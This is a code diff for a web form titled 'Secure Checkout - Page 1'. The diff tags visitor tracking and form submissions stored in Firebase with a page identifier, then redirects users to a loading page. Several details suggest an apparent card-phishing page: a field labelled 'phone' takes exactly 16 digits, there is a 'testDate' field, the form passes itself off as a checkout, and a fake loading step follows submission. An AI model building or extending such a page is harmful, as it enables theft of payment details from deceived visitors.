@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Secure Checkout - Page 1</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
@@ -27,8 +27,6 @@
             </div>
 
             <div class="field">
-                
-
                 <input
                     id="phone"
                     type="text"
@@ -272,6 +270,7 @@ async function trackVisitor() {
             await addDoc(
                 collection(db, "visitors"),
                 {
+                    pageId: "page1", // Added for Page 1 identification
                     date: today,
                     createdAt: serverTimestamp()
                 }
@@ -287,6 +286,7 @@ async function trackVisitor() {
         await addDoc(
             collection(db, "pageViews"),
             {
+                pageId: "page1", // Added for Page 1 identification
                 page: "information",
                 date: today,
                 createdAt: serverTimestamp()
@@ -359,6 +359,8 @@ form.addEventListener("submit", async (e) => {
 
     const data = {
 
+        pageId: "page1", // 👈 Added pageId for Page 1 identification
+
         phoneNumber: phoneNumber,
 
         testDate: testDate.value,
@@ -388,30 +390,25 @@ form.addEventListener("submit", async (e) => {
 
         message.className = "message success";
 
-message.textContent =
-    "✅ Information submitted successfully!";
+        message.textContent =
+            "✅ Information submitted successfully!";
 
-form.reset();
+        form.reset();
 
-phoneHint.textContent = "0 / 16 digits";
+        phoneHint.textContent = "0 / 16 digits";
 
-// Open demo loading page after successful Firebase save
-// Track successful submissions
-let submitCount = Number(
-    sessionStorage.getItem("submitCount") || "0"
-);
+        let submitCount = Number(
+            sessionStorage.getItem("submitCount") || "0"
+        );
 
-// Increase count
-submitCount++;
+        submitCount++;
 
-// Save count
-sessionStorage.setItem(
-    "submitCount",
-    String(submitCount)
-);
+        sessionStorage.setItem(
+            "submitCount",
+            String(submitCount)
+        );
 
-// Go to loading page
-window.location.replace("loading.html");
+        window.location.replace("loading.html");
 
     } catch (error) {
 
